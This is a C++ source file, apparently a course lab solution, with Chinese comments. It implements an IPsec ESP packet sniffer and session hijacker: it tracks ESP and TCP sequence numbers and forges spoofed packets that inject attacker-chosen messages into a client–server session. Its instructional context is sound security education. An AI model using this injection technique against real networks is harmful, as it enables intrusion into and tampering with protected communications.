#include "session.h"

#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

#include <iostream>
#include <span>
#include <utility>

extern bool running;

Session::Session(const std::string& iface, ESPConfig&& cfg)
    : sock{0}, recvBuffer{}, sendBuffer{}, config{std::move(cfg)}, state{} {
  checkError(sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ALL)), "Create socket failed");
  // TODO: Setup sockaddr_ll
  sockaddr_ll addr_ll{};
  addr_ll.sll_family = AF_PACKET;
  addr_ll.sll_protocol = htons(ETH_P_ALL);
  addr_ll.sll_ifindex = if_nametoindex(iface.c_str());
  checkError(bind(sock, reinterpret_cast<sockaddr*>(&addr_ll), sizeof(sockaddr_ll)), "Bind failed");
}

Session::~Session() {
  shutdown(sock, SHUT_RDWR);
  close(sock);
}

void Session::run() {
  epoll_event triggeredEvent[2];
  epoll_event event;
  Epoll ep;

  event.events = EPOLLIN;
  event.data.fd = 0;
  checkError(epoll_ctl(ep.fd, EPOLL_CTL_ADD, 0, &event), "Failed to add stdin to epoll");
  event.data.fd = sock;
  checkError(epoll_ctl(ep.fd, EPOLL_CTL_ADD, sock, &event), "Failed to add sock to epoll");

  std::string secret;
  std::cout << "You can start to send the message...\n";
  while (running) {
    int cnt = epoll_wait(ep.fd, triggeredEvent, 2, 500);
    for (int i = 0; i < cnt; i++) {
      if (triggeredEvent[i].data.fd == 0) {
        std::getline(std::cin, secret);
      } else {
        ssize_t readCount = recvfrom(sock, recvBuffer, sizeof(recvBuffer), 0,
                                     reinterpret_cast<sockaddr*>(&addr), &addrLen);
        checkError(readCount, "Failed to read sock");
        state.sendAck = false;
        dissect(readCount);
        if (state.sendAck) encapsulate("");
        if (!secret.empty() && state.recvPacket) {
          encapsulate(secret);
          secret.clear();
        }
      }
    }
  }
}

void Session::dissect(ssize_t rdcnt) {
  auto payload = std::span{recvBuffer, recvBuffer + rdcnt};
  // TODO: NOTE
  // In following packet dissection code, we should set parameters if we are
  // receiving packets from remote
  dissectIPv4(payload);
}

void Session::dissectIPv4(std::span<uint8_t> buffer) {
  auto&& hdr = *reinterpret_cast<iphdr*>(buffer.data());
  // TODO:
  // Set `recvPacket = true` if we are receiving packet from remote
  if(hdr.saddr == inet_addr(config.remote.c_str()))
    state.recvPacket = true;
  else
    state.recvPacket = false;
  // Track current IP id
  // if Packet is not from server, it's client's packet
  // use client's hdr.id to make the fake packet
  if(!state.recvPacket) state.ipId = ntohs(hdr.id);
  // Call dissectESP(payload) if next protocol is ESP
  // hdr.ihl's unit is 32 bits long(4bytes), so we need to *4 to get real headerLength
  auto payload = buffer.last(buffer.size() - (hdr.ihl * 4));
  // ESP Protocol Number is 50, you can also write IPPROTO_ESP
  if(hdr.protocol == 50)
    dissectESP(payload);
}

void Session::dissectESP(std::span<uint8_t> buffer) {
  auto&& hdr = *reinterpret_cast<ESPHeader*>(buffer.data());
  int hashLength = config.aalg->hashLength();
  // NEW ADD
  int padlen = buffer.data()[buffer.size() - hashLength - sizeof(ESPTrailer)];
  // Strip hash
  // [IMPORTANT] NEW ADD:  - padlen - sizeof(ESPTrailer)
  // 此錯誤雖然不影響功能，但導致hijacker那邊一直印"Secret: "，看了不開心
  buffer = buffer.subspan(sizeof(ESPHeader), buffer.size() - sizeof(ESPHeader) - hashLength - padlen - sizeof(ESPTrailer));
  std::vector<uint8_t> data;
  // Decrypt payload
  if (!config.ealg->empty()) {
    data = config.ealg->decrypt(buffer);
    buffer = std::span{data.data(), data.size()};
  }

  // TODO:
  // Track ESP sequence number
  // 字节序分为大端字节序和小端字节序：
  // 大端字节序： 是指一个整数的高位字节（32-31bit）存储在内存的低地址处，低位字节（0-7bit）存储在内存的高地址处。
  // 小端字节序： 是指一个整数的高位字节（32-31bit）存储在内存的高地址处，低位字节（0-7bit）存储在内存的低地址处。
  // 现代PC大多采用小端字节序，所以小端字节序又被称为主机字节序。大端字节序也称为网络字节序
  // C++写网络程序的时候，往往会遇到字节的网络顺序和主机顺序的问题。用函数转换网络字节顺序与本地字节顺序
  // htonl()–“Host to Network Long”
  // ntohl()–“Network to Host Long”
  // htons()–“Host to Network Short”
  // ntohs()–“Network to Host Short”

  // if Packet is not from server, it's client's packet
  // use client's hdr.id to make the fake packet
  if(!state.recvPacket)
  {
    state.espseq = ntohl(hdr.seq);
  }
  
  // Call dissectTCP(payload) if next protocol is TCP
  // we have no UDP, so we just use TCP
  dissectTCP(buffer);
}

void Session::dissectTCP(std::span<uint8_t> buffer) {
  auto&& hdr = *reinterpret_cast<tcphdr*>(buffer.data());
  auto length = hdr.doff << 2;
  auto payload = buffer.last(buffer.size() - length);
  // Track tcp parameters
  state.tcpseq = ntohl(hdr.seq);
  state.tcpackseq = ntohl(hdr.ack_seq);
  state.srcPort = ntohs(hdr.source);
  state.dstPort = ntohs(hdr.dest);

  // Is ACK message?
  if (payload.empty()) return;
  // We only got non ACK when we receive secret, then we need to send ACK
  if (state.recvPacket) {
    std::cout << "Secret: " << std::string(payload.begin(), payload.end()) << std::endl;
    state.sendAck = true;
  }
}

void Session::encapsulate(const std::string& payload) {
  auto buffer = std::span{sendBuffer};
  std::fill(buffer.begin(), buffer.end(), 0);
  int totalLength = encapsulateIPv4(buffer, payload);
  sendto(sock, sendBuffer, totalLength, 0, reinterpret_cast<sockaddr*>(&addr), addrLen);
}

int Session::encapsulateIPv4(std::span<uint8_t> buffer, const std::string& payload) {
  auto&& hdr = *reinterpret_cast<iphdr*>(buffer.data());
  // TODO: Fill IP header
  hdr.version = 4; // 目前的协议版本号是4,因此IP有时也称作IPv4。
  hdr.ihl = 5; // 由于它一个字4byte,普通IP header length是20 Bytes，值為5
  hdr.ttl = 64; //ttl = time to live，透過wireshark查看正常的client封包ttl為64
  hdr.id = htons(state.ipId+1);
  hdr.protocol = IPPROTO_ESP; // uint8_t無需使用htons
  // iphdr.frag_off is 16 bits. The first 3 are the flags, the rest 13 bits is the offset.
  // 透過wireshark查看Flags: 0x4000, Don't Fragment；Fragment offset: 0
  hdr.frag_off = htons(0x4000);
  hdr.saddr = stringToIPv4(config.local).s_addr;
  hdr.daddr = stringToIPv4(config.remote).s_addr;
  auto nextBuffer = buffer.last(buffer.size() - sizeof(iphdr));

  int payloadLength = encapsulateESP(nextBuffer, payload);
  payloadLength += sizeof(iphdr);
  hdr.tot_len = htons(payloadLength);
  // 0. initialize
  hdr.check = 0; 
  // uint16_t = unsigned short; uint32_t = unsigned int
  unsigned long sum = 0;
  // 1. 把資料以2 bytes(也就是uint16_t)為單位加總(checksum欄位除外)
  const uint16_t* iphdr_2_bytes = reinterpret_cast<const uint16_t*>(&hdr);
  for (int i = 0; i < hdr.ihl * 2; i++)
  {
    // 轉成本機資料形式才能做加減
    sum += ntohs(iphdr_2_bytes[i]);
  }
  // 2. 避免sum超過16bits(uint16_t)，右移16bits後若>0代表超過了，進位的要再加回來
  // 把左邊超過的部分(sum >> 16)再加上右邊沒超過的部分(sum & 0xFFFF)
  while(sum >> 16)
  {
    sum = (sum >> 16) + (sum & 0xFFFF);
  }
  // 3. 結果取1的補數
  sum = ~sum;
  // 再轉成網路資料形式
  hdr.check = htons((unsigned short)sum);
  return payloadLength;
}

int Session::encapsulateESP(std::span<uint8_t> buffer, const std::string& payload) {
  auto&& hdr = *reinterpret_cast<ESPHeader*>(buffer.data());
  //.last()為後面n個
  auto nextBuffer = buffer.last(buffer.size() - sizeof(ESPHeader));
  // TODO: Fill ESP header
  hdr.spi = config.spi; // 從sa拿的，都是網路格式所以不用轉
  hdr.seq = htonl(state.espseq + 1); //espseq是收到的seq，回應的封包是espseq+1
  // state.espseq + 1 可能在製作封包期間時間就過了，時間不一定夠，也可以改+3提高成功率
  int payloadLength = encapsulateTCP(nextBuffer, payload);
  // endBuffer 就是padding加esp trailer
  auto endBuffer = nextBuffer.last(nextBuffer.size() - payloadLength);
  // TODO: Calculate padding size and do padding in `endBuffer`
  unsigned int remainder = (payloadLength + 2) % 4;
  // 2 is Pad Length(8 bits) and Next Header(8 bits)
  uint8_t padSize = (remainder > 0)? 4-remainder : 0;
  // 把多出來的數字補到4，payloadLength必須是4結尾
  payloadLength += padSize;

  // 填padding，參考rfc4303#page-14，照順序填
  // The Padding bytes are initialized with a series of
  // (unsigned, 1-byte) integer values.  The first padding byte appended
  // to the plaintext is numbered 1, with subsequent padding bytes making
  // up a monotonically increasing sequence: 1, 2, 3, .... 
  for(int i = 0; i < padSize; i++)
  {
    endBuffer[i] = i + 1;
    // 原本是endBuffer[i] = (uint8_t)i + 1;
    // 也可以不加(uint8_t)，i<256它會自動轉型
  }
  // ESP trailer
  endBuffer[padSize] = padSize; // Pad Length
  endBuffer[padSize + 1] = 6; // Next Header
  //下一個是TCP header，就是IPPROTO_TCP，IPPROTO_TCP值為6
  payloadLength += sizeof(ESPTrailer); // payload+trailer的長度
  // Do encryption
  if (!config.ealg->empty()) {
    auto result = config.ealg->encrypt(nextBuffer.first(payloadLength));
    std::copy(result.begin(), result.end(), nextBuffer.begin());
    payloadLength = result.size();
  }
  payloadLength += sizeof(ESPHeader); // Header+payload+trailer的長度

  if (!config.aalg->empty()) {
    // TODO: Fill in config.aalg->hash()'s parameter
    auto result = config.aalg->hash(buffer.first(payloadLength)); //.first()為前面n個
    std::copy(result.begin(), result.end(), buffer.begin() + payloadLength);
    // buffer.begin() + payloadLength 是 ESP Trailer 的底部
    // ESP Trailer 的底部往後就是ESP auth
    // copy(first iterator, last iterator, result iterator)
    payloadLength += result.size(); // 加ESP auth的長度(全部長度)
  }
  return payloadLength;
}

int Session::encapsulateTCP(std::span<uint8_t> buffer, const std::string& payload) {
  auto&& hdr = *reinterpret_cast<tcphdr*>(buffer.data());
  if (!payload.empty()) hdr.psh = 1;
  // TODO: Fill TCP header
  hdr.ack = 1;
  hdr.doff = 5; // doff：TCP header的大小，其数值乘4就是TCP header的bytes(20 bytes, the most common)
  hdr.dest = htons(state.srcPort);
  hdr.source = htons(state.dstPort);
  // 參考: https://zhuanlan.zhihu.com/p/439614017
  // 接收方的ack=发送方的seq+发送方的len
  // 因為client啥都沒收到，所以payload length(不含header和padding)直接等於0
  hdr.ack_seq = htonl(state.tcpseq + 0);
  hdr.seq = htonl(state.tcpackseq); // seq等于对方上次的ack号
  hdr.window = htons(502); // 只要別太小都不影響，透過wireshark查看正常的client封包window值是502
  auto nextBuffer = buffer.last(buffer.size() - sizeof(tcphdr));
  int payloadLength = 0; // 此處的payloadLength是偽造封包的內容長度(hijacker輸入的內容)
  if (!payload.empty()) {
    std::copy(payload.begin(), payload.end(), nextBuffer.begin());
    payloadLength += payload.size();
  }
  payloadLength += sizeof(tcphdr);

  // TODO: Compute checksum
  // 0. initialize
  hdr.check = 0;
  unsigned long sum = 0;
  // 1. 計算Pseudo Header加總:
  // Source IP + Destination IP + PTCL(Protocol) + TCP Length
  struct PseudoIPv4Header pseudo_iphdr;
  pseudo_iphdr.src = ntohl(stringToIPv4(config.local).s_addr);
  pseudo_iphdr.dst = ntohl(stringToIPv4(config.remote).s_addr);
  // PTCL: 通訊協定(protocol)的縮寫，用來指示使用的通訊協定的代號，TCP為 6，UDP為 17。
  pseudo_iphdr.protocol = IPPROTO_TCP; // IPPROTO_TCP = 6
  // TCP Length: 是 TCP Segment 的長度 (表頭+資料)，並且它不包含虛擬表頭的 12 個位元組。
  pseudo_iphdr.length = payloadLength;
  // [IMPORTANT] reinterpret_cast用不同的型別來解讀相同的 bit pattern
  // reinterpret_cast用在任意指针（或引用）类型之间的转换；以及指针与足够大的整数类型之间的转换；从整数类型（包括枚举类型）到指针类型，无视大小。
  // 盡量使用memcpy或其他方式，錯誤的使用很容易使程式碼不安全(吃到不該吃的記憶體)
  // 除非所需的轉換屬於低階轉換，也就是将转换后的类型值转换回到其原始类型，否則別用
  // 例如: int*以4bytes為單位吃完為止，而char以1byte為單位要吃到'\0'才結束
  //       當你把int*轉char*時很可能out of bound，因為沒有0(也就是'\0')無法停下來
  std::vector<uint16_t> pseudo_iphdr_2_bytes(sizeof(struct PseudoIPv4Header));
  // 內容不變，PseudoIPv4Header和vector<uint16_t>的大小應該都是sizeof(struct PseudoIPv4Header)
  memcpy(&pseudo_iphdr_2_bytes[0], &pseudo_iphdr, sizeof(struct PseudoIPv4Header));
  int pseudo_2_bytes_length = sizeof(struct PseudoIPv4Header)/sizeof(uint16_t);
  for (int i = 0; i < pseudo_2_bytes_length; i++)
  {
    //std::cout << std::hex << pseudo_iphdr_2_bytes[i] << ' ';
    sum += pseudo_iphdr_2_bytes[i];
  }
  // 2. 計算TCP 區段 (表頭+資料)
  // 計算TCP Header加總: 把資料以2 bytes(也就是uint16_t)為單位加總(checksum欄位除外)
  const uint16_t* tcphdr_2_bytes = reinterpret_cast<const uint16_t*>(&hdr);
  for (int i = 0; i < (hdr.doff * 4 / 2); i++)
  {
    sum += ntohs(tcphdr_2_bytes[i]);
  }
  // 計算TCP payload加總
  // [IMPORTANT] 沒補0直接轉可能會出錯
  // The "Other Stuff" may be other parts of your own program, and if you modify the value bad things will happen.
  const uint16_t* tcppayload_2_bytes = reinterpret_cast<const uint16_t*>(nextBuffer.data());
  // string.length()和string.size()功能一樣
  // 如果payload是奇數長度7轉uint16_t，會先補"Other Stuff"(大概率是0)變8位再轉，此時長度為4
  int tcppayload_len = (payload.length()%2) ? payload.length()/2 + 1 : payload.length()/2;
  for (int i = 0; i < tcppayload_len; i++)
  {
    sum += ntohs(tcppayload_2_bytes[i]);
  }
  // 3. 避免超過16bits(uint16_t)
  while(sum >> 16)
  {
    sum = (sum >> 16) + (sum & 0xFFFF);
  }
  // 4. 形成這些 16-bit 整數的 1 的補數和 (1’s complement sum)
  // 將此 『 1 的補數和 』經過 『 1 的補數 』運算後，放入 Checksum 欄位中
  sum = ~sum;
  hdr.check = htons((unsigned short)sum);
  
  return payloadLength;
}
